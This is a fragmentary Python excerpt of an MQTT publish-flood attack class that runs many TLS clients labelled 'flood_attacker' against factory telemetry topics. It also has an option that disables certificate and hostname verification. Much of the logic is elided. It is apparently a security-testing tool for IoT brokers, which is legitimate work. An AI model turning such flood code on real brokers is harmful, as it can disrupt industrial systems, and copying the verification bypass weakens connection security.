...
class PublishFloodAttackTLS:
    ...
    def create_client(self, client_id, username=None, password=None):
        try:
            ...
            if self.ca_certs and os.path.exists(self.ca_certs):
                # Use tls_set with cafile (recommended)
                client.tls_set(ca_certs=self.ca_certs,
                               ...
                               ciphers=None)
                # Ensure verification is enforced unless insecure mode requested
                if getattr(client, "tls_set_context", None):
                    # nothing extra needed; we used CERT_REQUIRED
                    pass
            else:
                # No CA file provided — create default context (system trust store)
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                # if client cert/key provided and exist, load them
                ...
                # If user requested insecure mode, disable verification on the context
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                client.tls_set_context(ctx)

            # If user explicitly wants insecure mode, set tls_insecure_set
            if self.insecure:
                # This tells paho to skip host/cert verification
                try:
    ...
    def flood_worker(self, worker_id, num_messages, topics, delay_ms=0, username=None, password=None):
        client_id = f"flood_attacker_tls_{worker_id}"
    ...
    def launch_attack(self, num_workers=5, messages_per_worker=1000,
        ...
        if topics is None or len(topics) == 0:
            topics = [
                "factory/storage/storage-sensor_temp1/telemetry",
